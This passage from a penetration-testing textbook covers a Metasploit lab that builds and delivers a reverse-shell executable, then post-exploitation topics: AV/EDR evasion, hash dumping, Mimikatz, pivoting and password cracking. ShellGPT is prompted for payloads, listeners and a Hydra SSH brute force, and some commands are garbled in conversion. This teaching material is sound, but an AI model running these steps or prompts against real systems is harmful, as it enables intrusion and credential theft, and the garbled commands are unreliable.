simply displays the malicious file on the standard output, so redirect the resulting malicious file to your file system in the following directory/tmp/file.exe.

Challenge: Use msfvenom to run windows/shell/reverse tcp Payload in a standalone executable. You will need to set the LPORT parameters and LHOST, as shown in Figure 7.38.

Check the size of file.exe. It should be very close to 73,802 bytes (although it may be one or two bytes higher), as shown in Figure 7.39.

If tmp/file.exe isn’t 73,802 bytes (maybe plus a byte or two), delete it (with rm /tmp/file.

exe), check your syntax again for msfvenom, and regenerate it.

Step 2: Serve the file from Linux

Set up a web server Linux to serve the contents of your directory /Tmp (which includes file.

exe).





GenAI-driven exploitation testing techniques 245

Figure 7.37 Format of msfvenom executables.

Figure 7.38 Using msfvenom to create a TCP reverse payload.

Figure 7.39 Executable file size.





246 Traditional vs Generative AI Pentesting

Figure 7.40 HTTP.server.

Access with CD to the directory whose content you want to serve over HTTP. Then, launch the Python interpreter to invoke the module being called http.server, which listens on the TCP port 8000 (default), as shown in Figure 7.40.

With the http.server running in a window, we now move on to Step 3, invoking and con-

figuring the msfconsole The Metasploit.

Step 3: Configure msfconsole

Open another terminal window! In this second terminal window (separate from your http.

server command), invoke the msfconsole program, as shown in Figure 7.41.

At the msf prompt, send commands to Metasploit interactively. Tell them to view all the

exploits they have, as shown in Figure 7.42.

Figure 7.41 Interface msfconsole.





GenAI-driven exploitation testing techniques 247

Figure 7.42 Exploits option.

Metasploit offers more than 2000 different exploits for a variety of software vulnerabili-

ties. We will use exploit/multi/handler, also known as multi/handler. The order info The MSFConder can be used at any time to learn more about Metasploit’s thousands of modules,

including exploits, payloads, auxiliary modules, and more. The output provides a handy

summary of how to use the module, its variables, and other options for configuring it.

Use the info command to get more information about the multi/handler.

For the multi/handler, note the description: “This module is a stub that provides all the features of the Metasploit payload system exploits that have been launched outside the frame-

work.” After configuring the multi/handler, we’ll ask a user to download our malicious file.

exe file using a browser and run it manually (thus launching it outside of the framework).

The program file.exe connects to the multi/handler again, where we will control it.

We can use the multi/handler to wait for a file.exe connection. Use the use command to select the multi/handler, as shown in Figure 7.43.

Your prompt changes context to msf6 exploit (multi/handler) > . This tells you the specific context of the module in which msfconsole is running, as shown in Figure 7.44. We can now see all the payloads compatible with the exploit we chose by launching.

Figure 7.43 Use the multi/handler exploit.

Figure 7.44 Run the reverse_tcp payload.



248 Traditional vs Generative AI Pentesting

When we built file.exe, we asked msfvenom to construct a malicious EXE file using that

same payload (windows/shell/reverse tcp).

Interestingly, if we configure a malicious file like file.exe with a DIFFERENT payload than the one we return using the multi/handler in msfconsole, the payload returned by the multi/

handler has priority! In other words, a malicious file generated by Metasploit (as file.exe) will retrieve from the multi/handler a payload DIFFERENT from the one it was built with

and execute that different payload, overriding any functionality of its own payload. For this lab, however, we’ll be using the same payload in multi/handler that is used in file.exe with msfvenom.

Most pentesters use the same payload, so that’s what we’ll do here.

After selecting a payload, look at all the options that you can configure by running show options, as shown in Figure 7.45.

The order show options displays some important options, such as LHOST and LPORT

(the IP address and port number to which the delivered payload will connect).

We choose a payload windows/meterpreter/reverse_tcp, as shown in Figure 7.46.

Set the LHOST of the payload to your Linux IP address so that the payload can connect

to your Linux machine when it’s running on the Windows target. (Again, note that we could

override the LHOST that we built into file.exe if we chose a different address here, because the payload multi/handler and its configuration will override the payload file.exe. But we’ll use the same address of our Linux machine for this lab.) We will define LHOST at your local IP address or 0.0.0.0 so that it listens on all interfaces. In this case, our payload file (file.exe) knows where to connect since we have provided the LHOST with msfvenom.

Define the LHOST and the LPORT, and then confirm the settings with show options, as

shown in Figure 7.47.

Figure 7.45 Multi/handler exploit options.





GenAI-driven exploitation testing techniques 249

Figure 7.46 Configuring the payload.

Figure 7.47 LHOST and LPORT of the multi/handler exploit.





250 Traditional vs Generative AI Pentesting

To enable the multi/handler, please run the following command, as shown in Figure 7.48.

Now run the exploit command with the -j option command to “jobify” the exploit execution, as shown in Figure 7.49.

You should now see an indication that the multi/handler is listening in the background

and find your msfconsole prompt. In msfconsole, you can have an arbitrary number of tasks

running in the background, each doing different things on different ports.

At any time, you can get a list of background jobs from msfconsole by performing, as

shown in Figure 7.50.

Step 4: Download the file in Windows

Open Chrome and surf the following URL:

http://ADRESSE_IP_MACHINE_LINUX:8080.

You should see a list of the contents of your Linux /tmp directory as shown in Figure 7.51, which includes file.exe.

Figure 7.48 Lanche the exploit multi/handler.

Figure 7.49 Background the exploit.

Figure 7.50 View current exploits.





GenAI-driven exploitation testing techniques 251

Figure 7.51 Downloading the file to the target machine.

Figure 7.52 Incoming HTTP GET requests.

Click on the file.exe. Your browser will download the file and display it in the bottom left corner of the browser window. Click the file at the bottom of the browser window. Your

browser should ask you for a message saying, “Do you want to run or save the.exe file?”

Click Run. In your Linux terminal running http. server, you should see HTTP requests GET

Incoming, as shown in Figure 7.52.

In your msfconsole terminal on Linux, you should see the incoming session attempt with

the text “Command shell session 1 opened,” with information about IP addresses and source

and destination port numbers.

If you see a successful session, please proceed to step 5 below.

Sometimes, the shell command session dies and Metasploit says “Command shell session 1

closed. Reason: Died…” If this happens to you, go back to your Windows browser, click file.

exe, then click execute.





252 Traditional vs Generative AI Pentesting

Also, at any time, you can run the jobs command to make sure your multi/handler is still

running.

Step 5: Shell

In your Linux msfconsole screenPress Entrance until you get the prompt again MST6 > .

You should review your msf prompt. You have a meterpreter session with the target

Windows machine running in the background, as shown in Figure 7.53.

You now see a list of all the sessions that Metasploit opened with targets. It is likely that one of these sessions has a weak ID number (such as the “1” number). Make a note of this

session number. Let’s interact with this session by running the sessions -i N, in our case (1) is the session number, as shown in Figure 7.54: sessions -i 1.

You should now see the prompt c:\> of your Windows machine. We have gained access to the shell of the Windows target. You can now type a variety of Windows commands in this

session.

Figure 7.53 Launching the multi/handler exploit.

Figure 7.54 List of open sessions.





GenAI-driven exploitation testing techniques 253

To find out your current privileges, run:

C:\> whoami

For a list of TCP activity and UDPRun:

C:\> netstat -na

In the output of netstat, you should see an ESTABLISHED connection from your Windows

machine to your Linux machine on the TCP port 9999.

To get a list of directories in the c:\ directory, run:

C:\> cd:\

C:\> dir

You can run arbitrary additional commands at this Windows prompt, exploring the system

from the perspective of an msfconsole session with the target machine.

To see the network settings, please run:

C:\> ipconfig

You can explore your Windows machine from the command line.

After you finish interacting with your shell, kill him with CTRL- C.

Here you will see that you can kill sessions from msfconsole using either the -k to kill an individual session number or the -k (K uppercase) to kill all sessions.

In conclusion, in this lab, you have analyzed how to use several components of Metasploit

to compromise a target machine and interact with a session on that target.

Payload and exploit generation

1. Reverse Shell Payload Creation:

◦ “Generate a reverse TCP payload using msfvenom with lhost=192.168.1.10 and

lport=4444 in EXE format.”

2. Bind Shell Exploit:

◦ “Create a bind shell payload using msfvenom for a Linux target on port 5555.”

3. Custom Exploit Code:

◦ “Write a Python exploit to exploit a buffer overflow vulnerability with a payload

size of 1024 bytes targeting port 8080.”

4. EternalBlue Exploit:

◦ “Provide the steps to use the Metasploit module for exploiting MS17- 010

(EternalBlue) on an unpatched Windows 10 machine.”

Perform system hacking using ShellGPT

Using ShellGPT for system hacking involves leveraging its AI capabilities to identify and

exploit system vulnerabilities (Zaydi & Maleh, 2024). ShellGPT automates tasks such as password cracking, vulnerability scanning, and exploit development, enhancing the efficiency of ethical hackers. It provides advanced tools for penetration testing and securing systems

against potential threats (Ayyaz & Malik, 2024).

The commands generated by ShellGPT may vary depending on the prompt used and the

tools available on the machine. Due to these variables, the output generated by ShellGPT





254 Traditional vs Generative AI Pentesting

Figure 7.55 Generate payload through SGPT.

might differ from what is shown in the screenshots. These differences arise from the dynamic nature of AI’s processing and the diverse environments in which it operates. As a result, you may observe differences in command syntax, execution, and results while performing this

lab task.

Generate a payload

After incorporating the ShellGPT API into the Parrot Security Machine, open the terminal

window and run the following command, as shown in Figure 7.55:

sgpt --shell "Use msfvenom to create a TCP payload with

lhost=172.16.253.130 and lport=9990"

Using ShellGPT for system hacking involves leveraging its AI capabilities to identify and

exploit system vulnerabilities (Hilario et al., 2024). To continue with the task, start by running the Parrot Security and Ubuntu virtual machines. Before proceeding, ensure ShellGPT

is integrated into the Parrot Security Machine as described in the setup instructions. After successful integration, use the ShellGPT API to generate a TCP payload by running the

command: sgpt --shell “Use msfvenom to create a TCP payload with lhost=10.10.1.13 and

lport=444.” Type E at the prompt and press Enter to execute the command. Next, initialize

a listener on the specified LHOST and LPORT by running: sgpt --shell “Use msfconsole to

start a listener with lhost=172.16.253.130 and lport=999à.” Again, type E and press Enter

to execute. Once the listener is successfully initialized, note that as the payload is not being executed on the victim’s machine during this lab, no session will be established. Finally, to conclude this process, exit msfconsole by typing the exit command. This structured yet flexible use of ShellGPT demonstrates its power in automating and simplifying system hacking

tasks, as shown in Figure 7.56.

To perform an SSH brute- force attack on the target machine using Hydra, utilize the com-

mand generated by ShellGPT. Execute the following command: sgpt --shell “Use Hydra to

perform SSH- bruteforce on IP address=172.16.253.130 using username.txt and password.

txt files available at location /home/attacker/Wordlist.” This command leverages the provided wordlist files to crack the SSH username and password of the target machine with IP address 172.16.253.130. At the prompt, type E and press Enter to execute the command. Hydra will

then use the wordlists to successfully identify the SSH credentials for the specified target, as indicated in the example output. This illustrates the efficiency of Hydra in conducting bruteforce attacks for penetration testing purposes, as shown in Figure 7.57.





GenAI-driven exploitation testing techniques 255

Figure 7.56 Lunch listener through SGPT.

Figure 7.57 Perform SSH- brute force through SGPT.

Conclusion

This chapter provided a comprehensive exploration of exploiting identified vulnerabilities

using Metasploit and the AI- powered ShellGPT. We covered fundamental concepts such

as reverse and bind shells, staged and non- staged payloads, and categories of exploitation, including service- side, client- side, and privilege escalation attacks. The chapter demonstrated practical applications through hands- on examples, including exploiting well- known vulnerabilities like VSFTPD and EternalBlue, leveraging payload generation with msfvenom, and

automating tasks like SSH brute- force attacks with Hydra.

Furthermore, the integration of ShellGPT showcased the transformative role of AI in pen-

etration testing. By automating payload generation, exploit development, and reconnaissance tasks, ShellGPT enhances efficiency, reduces human error, and streamlines complex tasks.

These AI- driven capabilities complement traditional tools, allowing penetration testers to achieve precision and scalability in ethical hacking.





256 Traditional vs Generative AI Pentesting

REFERENCES

Austin, A., & Williams, L. (2011). One Technique is Not Enough: A Comparison of Vulnerability Discovery Techniques. 2011 International Symposium on Empirical Software Engineering and Measurement, 97–106. https://doi.org/10.1109/ESEM.2011.18

Ayyaz, S., & Malik, S. M. (2024). A Comprehensive Study of Generative Adversarial Networks

(GAN) and Generative Pre- Trained Transformers (GPT) in Cybersecurity. 2024 Sixth International

Conference on Intelligent Computing in Data Sciences (ICDS), 1–8.

Balajinarayan, B. (2019). A Study on Metasploit Payloads. International Journal of Cyber- Security and

Digital Forensics, 8(4), 298–308.

Fatima, A., Khan, T. A., Abdellatif, T. M., Zulfiqar, S., Asif, M., Safi, W., Al Hamadi, H., & Al- Kassem,

A. H. (2023). Impact and research challenges of penetrating testing and vulnerability assessment on

network threat. 2023 International Conference on Business Analytics for Technology and Security

(ICBATS), 1–8.

Hilario, E., Azam, S., Sundaram, J., Imran Mohammed, K., & Shanmugam, B. (2024). Generative AI

for pentesting: the good, the bad, the ugly. International Journal of Information Security, 23(3),

2075–2097.

Kaushik, K., Aggarwal, S., Mudgal, S., Saravgi, S., & Mathur, V. (2021). A novel approach to generate

a reverse shell: Exploitation and Prevention. International Journal of Intelligent Communication,

Computing and Networks Open Access Journal, 2582–7707.

Kennedy, D., Aharoni, M., Kearns, D., O’Gorman, J., & Graham, D. G. (2024). Metasploit. No Starch

Press.

Kennedy, D., O’Gorman, J., Kearns, D., and Aharoni, M. (2011). Metasploit: the penetration tester’s

guide. No Starch Press.

Maleh, Y. (2024). Web application PenTesting: A comprehensive Guide for professionals. CRC Press.

Velu, V. K. (2022). Mastering Kali Linux for Advanced Penetration Testing: Become a cybersecurity

ethical hacking expert using Metasploit, Nmap, Wireshark, and Burp Suite. Packt Publishing Ltd.

Zaydi, M., & Maleh, Y. (2024). Empowering Red Teams with Generative AI: Transforming Penetration Testing Through Adaptive Intelligence. EDPACS, 1–26. https://doi.org/10.1080/07366981.2024.

2439628





Chapter 8

Post- exploitation techniques and AI- driven

privilege escalation

INTRODUCTION

Post- exploitation is one of the most crucial and intricate phases of penetration testing, where testers move beyond the initial compromise to explore the full scope of system vulnerabilities and weaknesses (Benito et al., 2023a). During this phase, ethical hackers focus on escalating privileges, maintaining access, and identifying further attack vectors within the compromised system (Tabatabai Irani & Weippl, 2009). Traditionally, these tasks were manual and time- consuming, relying on tools such as Mimikatz, Metasploit, and WinPEAS to facilitate

privilege escalation, lateral movement, and persistence mechanisms (Maleh, 2024). However, the integration of Generative AI tools, such as ShellGPT, into post- exploitation techniques is transforming this process by automating routine tasks and enhancing the precision and speed of penetration testing (Zaydi & Maleh, 2024).

In this chapter, we delve into the post- exploitation process, offering an in- depth exploration of how AI can streamline and optimize traditional post- exploitation tasks. From privilege escalation to password cracking and lateral movement, AI- driven tools like ShellGPT facilitate the automation of time- intensive processes, reducing manual effort and human error.

The combination of Metasploit modules, AI- generated commands, and advanced scripting

offers an unprecedented level of efficiency in enumerating systems, generating and executing payloads, and even bypassing security controls.

Additionally, the chapter covers practical examples of how AI assists in tasks such as

identifying system misconfigurations, automating the creation of malicious payloads, and

facilitating the exploitation of vulnerabilities like Sticky Keys. By utilizing AI to automate routine aspects of post- exploitation, penetration testers can focus more on strategic decision-making, such as determining the most effective attack paths or evaluating potential system

weaknesses.

This chapter not only showcases the integration of AI in post- exploitation but also pro-

vides actionable insights into leveraging these advanced tools for ethical hacking purposes, all while adhering to responsible and ethical guidelines. It is designed to equip penetration testers with the knowledge and skills to harness AI- driven automation, enabling them to conduct more efficient, accurate, and strategic penetration testing engagements.

POST- EXPLOITATION TECHNIQUES

The term post- exploitation refers to the actions performed by a Pentester after it has gained

a certain level of access to the target system (Benito et al., 2023b). Some post- exploitation actions include elevation of privileges, extend control to additional machines (Lateral movements), install backdoors (backdoor), download files and tools to the target machine, etc.

DOI: 10.1201/9781003640318-8

257





258 Traditional vs Generative AI Pentesting

Post- exploitation is the critical phase that follows successful access to a target system. It involves interacting with the compromised system to gather further information, pivot to

other targets, and establish long- term control. The main goals of this phase include:

• Analyzing and exploring the compromised system: Using shell access tools such as cmd.

exe, Meterpreter, or /bin/sh.

• Utilizing resources for pivoting and escalation: Discovering and exploiting other connected systems.

• Demonstrating the impact: Providing insights into business risks posed by the exploited vulnerabilities.

The activities in this phase are ethical obligations for penetration testers to highlight security flaws while respecting organizational rules of engagement.

FILE TRANSFER TECHNIQUES: PUSH VS PULL

Moving files to or from the compromised system is a vital post- exploitation step. Depending on the type of access, testers can:

1. Push Files: Sending files (e.g., payloads or tools) directly from the attacker’s machine to the target.

◦ Example: Uploading malicious binaries or scripts for further operations.

2. Pull Files: Commanding the target to download files from an external server.

◦ Example: Using the target’s wget or PowerShell commands to retrieve files.

Figure 8.1 illustrates these approaches, where Push involves direct upload, and Pull relies on the target fetching the data.

File transfer services

Various services and protocols are utilized for transferring files:

• HTTP(S): Using tools like wget, Lynx, or PowerShell to transfer files over ports 80 or 443.

• SCP: Secure file transfer via SSH, typically on port 22.

Figure 8.1 Push and pull techniques.





Post-exploitation techniques and AI-driven privilege escalation 259

• FTP: Common but less secure, involving ports 20 and 21.

• TFTP: A lightweight protocol using UDP port 69 for environments with minimal

overhead.

Alternative methods for file transfer

In cases where direct transfers are restricted, alternative techniques include:

1. Meterpreter Commands: Using Metasploit’s Meterpreter for uploading/downloading

files.

2. Network Shares: Mounting shared drives using SMB or NFS for indirect access.

◦ Example: Requesting the target to mount an attacker- controlled SMB share

(Figure 8.2).

3. Netcat: Establishing raw network connections for file transfers.

4. Echo and Paste: Encoding files into plain- text format for manual transfer and reassembly.

Alternative file transfer methods

For scenarios where traditional methods are restricted or unavailable, penetration testers can rely on alternative approaches to transfer files to and from the compromised system. These

include:

1. Using Meterpreter:

◦ meterpreter > upload [local_filename]

◦ meterpreter > download [remote_filename]

◦ meterpreter > cat [remote_filename]

◦ meterpreter > edit [remote_filename]

Meterpreter opens files in the default editor of the system, such as vim for Linux systems.

2. Echo Command:

◦ Limited shell access can still allow text file creation:

− For Linux/Unix:

◦ $ echo “this is part of the file” » file.txt

◦ C:\> echo this is part of the file » file.txt

3. Command- Line Paste:

◦ For manually reconstructing files by pasting and appending lines directly in the

terminal.

Figure 8.2 Method for file transfer.





260 Traditional vs Generative AI Pentesting

LOOTING FILES

Once access to a target system is achieved, post- exploitation focuses on collecting valuable data:

1. Sensitive Data Search:

• Target user files, desktop folders, or document repositories.

• Look for credentials or keys stored locally.

2. Source Code:

• Particularly useful on web servers; analyzing local code can reveal hidden vulner-

abilities or stored passwords.

3. Common File Targets:

• Password files (password.txt), Word documents, Excel sheets, or any files left on the

desktop by users.

FILE TRANSFER

See Figure 8.3.

EVASION TACTICS

To maintain stealth during post- exploitation, bypassing security mechanisms such as Anti-

Virus (AV) and Endpoint Detection and Response (EDR) tools is crucial.

1. Common AV/EDR Blocking Mechanisms:

• AV/EDR can detect malicious payloads through:

− Email delivery.

− File- sharing platforms or USB devices.

− Exploits during download or execution phases.

2. Bypassing AV/EDR:

• Disable AV/EDR: This weakens the system but can be risky as it may alert

administrators.

• Encode Malware: Alter payload signatures to avoid detection.

• In- Memory Execution: Load malware directly into memory without touching the disk.

• Custom Compilation: Create malware with unique compilation options to evade

detection (Figure 8.4).

3. Best Practices for Evasion:

• Use encrypted communication channels.

• Leverage legitimate tools for malicious purposes to blend in with regular system activity.

These methods provide flexibility when traditional protocols are blocked, ensuring seamless file delivery or retrieval in restrictive environments.

Figure 8.3 Generate SCP command to transfer file through SGPT.





Post-exploitation techniques and AI-driven privilege escalation 261

Figure 8.4 msfvenom encoders.

PIVOTING AND CRACKING

The primacy of passwords

Passwords remain the primary method of user authentication in today’s networks, whether

within intranets or systems accessible via the internet. These include VPNs, SSH connections, web applications, and email services.

Professional penetration testers and ethical hackers must understand password- related

attack methodologies at an advanced level. As a professional penetration tester noted: “It was during my first intrusion test with a renowned InfoSec expert that I truly grasped the critical importance of understanding password- related attacks.” Passwords are integral to intrusion testing, serving as a cornerstone for both the offensive and defensive sides of cybersecurity.

Password guessing vs. password cracking

Password guessing (online):

• This method involves guessing passwords directly on target systems to gain access.

• Risks include generating excessive network traffic and logs, which can alert the target.

• Account lockouts due to repeated failed login attempts can lead to a dangerous Denial

of Service (DoS) condition.

• It is slower compared to password cracking and less stealthy.





262 Traditional vs Generative AI Pentesting

Password cracking (offline):

• This method involves stealing hashed passwords and analyzing them on the attacker’s

machine.

• The hashes are cracked by guessing, hashing, and comparing against the captured hashes.

• This approach does not lock accounts, making it more covert.

• It is orders of magnitude faster than online guessing methods.

Synchronized passwords

Users often reuse or synchronize passwords across multiple systems. This tendency can be

exploited by attackers:

• Utility of Reused Passwords:

• Even if a password grants limited access in one environment, it may unlock elevated

privileges or critical resources in another.

• Identifying passwords used across different machines can be highly advantageous,

particularly when higher- privilege accounts have overlapping credentials.

• Suspicious Passwords:

• Passwords used on compromised machines with special privileges, such as UID 0 or

SYSTEM, should be prioritized for further analysis.

• Attackers can leverage tools to crack these passwords, gaining broader access to the

environment.

• Dedication to Password Cracking:

• Passwords with valuable patterns or privileges should be subjected to thorough

cracking efforts using appropriate tools.

Dictionaries for password cracking

Creating a robust dictionary is vital for efficient password cracking:

• Building a Comprehensive Dictionary:

• Use free dictionaries such as those from Ron Bowes or Crackstation, which provide

extensive password lists derived from data breaches.

• These resources are available for download at sites like SkullSecurity.

• Tailored Dictionary Creation:

• Customize dictionaries to suit specific environments by analyzing publicly available

lists or creating a focused wordlist.

• Filter out duplicates to optimize performance:

$ cat wordlist.txt | sort | uniq > dictionary.txt.

By understanding password reuse tendencies, leveraging offline cracking over risky online

guessing, and refining password dictionaries, penetration testers can effectively exploit password vulnerabilities.

IMPROVING SPEED IN PASSWORD CRACKING

• Distribution across Machines:

• Split the wordlist across multiple systems to accelerate brute force attempts.

• Use varied character sets to test diverse password combinations efficiently.





Post-exploitation techniques and AI-driven privilege escalation 263

• Cloud- Based Resources:

• Consider leveraging commercial cloud services for password decryption:

− Amazon EC2 high- intensity CPU instances cost around $0.10 per hour for

Linux- based cracking tasks.

− GPU instances, offering 33 compute units with the power of dual NVIDIA

GPUs, are priced at approximately $2.00 per hour.

• Various other cloud providers offer competitive solutions for consideration.

• Recommended Tools:

• Use NPK ( GitHub: Coalfire- Research/ NPK), which integrates with AWS for cost-effective and rapid password cracking.

PASSWORDS WITHOUT CRACKING

• Obtaining Passwords Using Alternative Methods:

• Capture plaintext protocols such as Telnet, FTP, or HTTP.

• Utilize keylogging tools for stealth password collection.

− Caution: Ensure keyloggers align with project engagement rules.

− Remember to delete keylogging tools after the testing phase.

• Hash Reuse Instead of Cracking:

• Sometimes, there is no need to decrypt the password; utilizing its hash is sufficient.

• Hash- passing techniques are effective for many operating systems and applications,

particularly with Windows hashes.

ATTENTION TO INFORMATION LEAKS

• Avoid Collecting Redundant Copies:

• Refrain from keeping unnecessary password file duplicates.

• Target critical files such as:

− /etc/passwd and /etc/shadow in Linux/UNIX.

− SAM backup files in Windows.

− Ntds.dit from Active Directory.

• Online Hash Searches:

• Searching for captured hashes online can be effective but risky.

• Always consider the implications of non- disclosure agreements and organizational

policies.

BEST PRACTICES FOR HANDLING PASSWORDS

• Avoid Cracking on Target Systems:

• Never crack passwords directly on the compromised system to avoid detection or

performance impact.

• Secure Copying of Password Files:

• Safeguard password files during transfer from target systems:

− In Linux/UNIX, use Secure Shell (SSH) for encrypted transfers.

− In Windows, use tools for dumping password hashes securely via encrypted

Meterpreter sessions or frameworks such as Empire.





264 Traditional vs Generative AI Pentesting

• Precautionary Measures:

• Use caution when accessing or editing original password files on target systems.

• Ensure files remain intact during handling to prevent triggering alarms or corruption.

This detailed breakdown ensures ethical handling and efficient use of resources in post-

exploitation tasks while adhering to professional penetration testing protocols.

POST- TEST ANALYSIS AND REPORTING

At the end of a penetration test, it is essential to produce a detailed report on the findings related to password security. Key questions to address in the report include: How many passwords were found? Are there a significant number of eight- character passwords? Are passwords such as

“SeasonYear” (e.g., “Summer2024”) common, possibly referencing local sports teams or events?

What percentage of passwords were successfully cracked? Additionally, assess the number of

compromised sensitive accounts to evaluate the potential impact on organizational security.

As a best practice, recommend that users update all compromised passwords immedi-

ately. Ensure a thorough cleanup of passwords and hashes collected during the testing phase, and remember to exclude sensitive data from the report while retaining the analysis results (Baloch, 2017).

DUMPING HASHES WITH METERPRETER

Hash dumping is a critical step in post- exploitation and often requires SYSTEM- level privileges. Meterpreter can execute hash dumping entirely in memory, minimizing detection risks.

The following commands are commonly used for hash dumping:

• Pulling from Memory: meterpreter > hashdump

• Pulling from Registry (SAM and Syskey): meterpreter > run hashdump

• Smart Hashdump: meterpreter > run post/windows/gather/smart_hashdump

• Disk Dumping: Extract hashes directly from DCs (Domain Controllers) or SAM files.

These capabilities enable penetration testers to obtain and analyze credential data without leaving significant traces on the target system.

DUMPING CREDENTIALS WITH MIMIKATZ

Mimikatz, created by Benjamin Delpy, is a powerful tool for extracting credentials from

Windows memory. It retrieves authentication data by searching memory areas like LSASS

for password hashes and plaintext passwords. Originally created as an independent execut-

able (mimikatz.exe), it can now also be integrated with Meterpreter for seamless execution

(Blaauwendraad et al., 2020).

Key functionalities include:

• Extracting password hashes and plaintext credentials.

• Running as a standalone tool or as a Metasploit Meterpreter module.

The integration of Mimikatz simplifies credential harvesting and enables more comprehen-

sive post- exploitation analysis (Elgohary & Abdelbaki, 2022).





Post-exploitation techniques and AI-driven privilege escalation 265

WHY PIVOT?

Pivoting is a crucial technique for leveraging a compromised system to access additional

systems within a network. Attackers in real- world scenarios use compromised machines as

launch pads to infiltrate deeper into a target network. Penetration testers must emulate these tactics to accurately assess an organization’s security posture.

Common pivoting techniques include:

• SSH Port Forwarding: Redirects traffic through a secure channel.

• Meterpreter: Enables advanced network pivoting functionalities.

Other common methods involve firewall port redirection and tools such as Netcat. By imple-

menting these methods, testers can simulate realistic lateral movement scenarios and demon-

strate the broader impact of initial compromises within the network.

PIVOTING USING METASPLOIT’S ROUTE COMMAND

Metasploit includes a routing command to enable testers to pivot through an already

exploited host using a Meterpreter session. This allows testers to transfer exploits and payloads to additional systems through the compromised host. The route command sets up rout-

ing tables within the Metasploit environment, which is distinct from modifying system- level routing tables.

Steps include:

1. Exploit the initial victim system and establish a Meterpreter session.

2. Use the route add command to define a route for the target network subnet through the

current Meterpreter session.

3. Proceed to exploit secondary victims on the pivoted network.

By utilizing this functionality, testers can extend their access to internal systems within the compromised environment.

SSH local port forwarding

Local port forwarding allows the redirection of a local port to a specific remote host and port via an SSH tunnel. For example, a local port such as 8888 can be tunneled through a pivot

system to access an internal web server running on port 80.

This technique is useful for securely accessing internal services without direct connectivity, enabling seamless interaction with restricted systems.

SSH remote port forwarding

Remote port forwarding redirects a port from the pivot system to a local port on the attack-er’s machine. For instance, a web server on the pivot system’s port 80 can be exposed and

accessed on port 8000 of the attacker’s machine (Wang et al., 2024).

• Command Example: While not as commonly used as local port forwarding, this method

is valuable in scenarios where external access to internal services is required.





266 Traditional vs Generative AI Pentesting

SSH dynamic port forwarding

Dynamic port forwarding creates a SOCKS proxy that can redirect traffic to multiple hosts

or ports. This is particularly useful for applications that support SOCKS or proxy chaining.

By configuring applications or browsers to use the SOCKS proxy, testers can access inter-

nal assets through the pivot system. This approach is highly versatile for exploring internal network environments and accessing multiple systems with a single proxy connection.

Port forwarding via a Meterpreter session

Meterpreter sessions provide functionalities like port forwarding, which is useful for transferring specific ports. For instance:

• Add a local TCP relay with:

meterpreter> portfwd add -1 1234 -r 10.9.8.7 -p 80

[*] Local TCP relay created: 0.0.0.0:1234 <-> 10.9.8.7:80

This redirects local port 1234 to the target machine’s 10.9.8.7 on port 80.

Additionally, SOCKS proxies can be configured to route traffic through a Meterpreter

session:

• Command:

meterpreter > run post/multi/manage/autoroute SUBNET=192.168.1.0

CMD=add

[!] SESSION may jjot be compatible with this module. [*] Running

module against TRINITY

[*] Adding a route to 10.10.10.0/255.255.255.0… [+] Route added to

subnet 10.10.10.0/255.255.255.0. meterpreter > back

msf5 > use auxiliary/server/socks4a

msf5 auxiliary(socks4a) > set SRVPORT 9000 msf5 auxiliary(socks4a) >

run

[*] Starting the socks4a proxy server

This allows testers to tunnel network traffic effectively, routing it through compromised

systems for deeper penetration.

Meterpreter sessions via MSF route

To gain an additional Meterpreter session, Metasploit’s route functionality can be used. This involves:

1. Compromising the first system to gain a Meterpreter session.

2. Utilizing the route feature to target a secondary system on the internal network.

3. Launching exploits through this route, allowing testers to pivot further.

This technique enables deep access to protected environments through layered sessions.





Post-exploitation techniques and AI-driven privilege escalation 267

SSH local and dynamic port forwarding

For enhanced access, testers can leverage both local and dynamic port forwarding:

• Local Port Forwarding: Redirects a local port to a remote host’s specific port. For example, forwarding port 8888 locally to 192.168.1.20:80 allows testers to access an inter-

nal web server (Figure 8.5).

• Dynamic Port Forwarding: Creates a SOCKS proxy for flexible port redirection. This setup enables browsing of multiple internal resources as if they were locally accessible

(Figure 8.6).

Both methods are essential for bypassing restrictive environments and ensuring efficient data routing during penetration testing.

Figure 8.5 Local port forwarding.

Figure 8.6 Dynamic port forwarding.





268 Traditional vs Generative AI Pentesting

CRACKING PASSWORDS WITH JOHN THE RIPPER

John the Ripper is a powerful tool for password cracking:

• The free version is available at www. openwall. com/ john, while the commercial version offers additional features for $40.

• It supports various password types, including:

• Traditional DES on Linux/Unix.

• NTLM, MD5, Blowfish, and more on Windows systems.

• Other hashes like Kerberos, MySQL, and S/Key.

John the Ripper is widely used due to its robust algorithms and large, customizable wordlists.

Features such as “JumboPatch” enhance its ability to crack diverse password formats effi-

ciently. This tool is indispensable for penetration testers focused on exposing vulnerabilities in authentication mechanisms.

MULTITHREADED AND GPU CRACKING WITH HASHCAT

Hashcat is a powerful multi- threaded password cracking tool that supports both CPU and

GPU- based cracking. It achieves impressive speeds up to 18 million hashes per second on

CPUs and 1 billion hashes per second on GPUs. Available for free and open source at www.

hashcat. net, Hashcat implements over 245 password algorithms, including LANMAN, NT, mdscrypt, sha512crypt, and many others. The tool leverages OpenCL implementations to

run on CPUs and GPUs, requiring specific drivers for compatibility. It is available for both Windows and Linux platforms. While Hashcat offers significantly more advanced options to

fine- tune attacks compared to tools like John the Ripper, it is less user- friendly. It does not automatically detect hash types and features a more complex command- line interface, making it better suited for experienced penetration testers who need granular control over their cracking methods.

ELEVATION OF PRIVILEGE

• Elevation of privilege typically involves moving from a lower authorization account to a higher authorization account. More technically, it is the exploitation of a vulnerability, a design flaw, or a misconfiguration in an operating system or application to gain

unauthorized access to resources that are typically reserved for users (Dutt, 2021).

• It is rare, during a real- world penetration test, to be able to have initial access that gives direct administrative access. Elevation of privilege is crucial because it allows you to

gain system administrator access levels and perform actions such as:

• Reset passwords.

• Bypassing access controls to compromise protected data.

• Changing software configurations.

• Enable persistence.

• Change the privilege of existing (or new) users (Figure 8.7).





Post-exploitation techniques and AI-driven privilege escalation 269

Figure 8.7 Elevation of privilege.

ELEVATION OF PRIVILEGE: THE ENUMERATION

• The enumeration is the first step we need to take once we have access to any system.

You may have gained access to the system by exploiting a vulnerability critical that

resulted in access to the root level or simply found a way to send commands using

a low- privilege account. Penetration testing engagements do not end once you have

access to a specific system or user privilege level. Enumeration is also important during

the post- operation phase than before.

User enumeration

• When initially accessing a target, one of the first things we need to identify is the user’s context. The order whoami, available on both Windows and Linux platforms, is a good

place to start.

• When run without parameters, whoami will display the username under which the shell

complied (Figure 8.8).

Shell GPT can help automate user and system enumeration (Figures 8.9 and 8.10).

Figure 8.8 whoami command.





270 Traditional vs Generative AI Pentesting

Figure 8.9 Enumerate users and groups through SGPT.

Figure 8.10 Enumerate users accounts with UID through SGPT.

